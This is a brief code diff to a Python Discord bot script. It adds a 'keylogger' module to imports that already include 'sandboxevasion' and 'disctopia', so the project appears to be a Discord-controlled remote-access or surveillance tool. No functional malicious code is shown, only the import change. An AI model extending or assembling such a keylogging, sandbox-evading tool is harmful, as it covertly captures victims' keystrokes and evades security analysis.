@@ -8,7 +8,7 @@ import discord
 from discord.ext import commands
 from discord import app_commands
 
-from libraries import sandboxevasion,disctopia
+from libraries import keylogger,sandboxevasion,disctopia
 
 GUILD = discord.Object(id = "{GUILD}")
 CHANNEL = {CHANNEL}
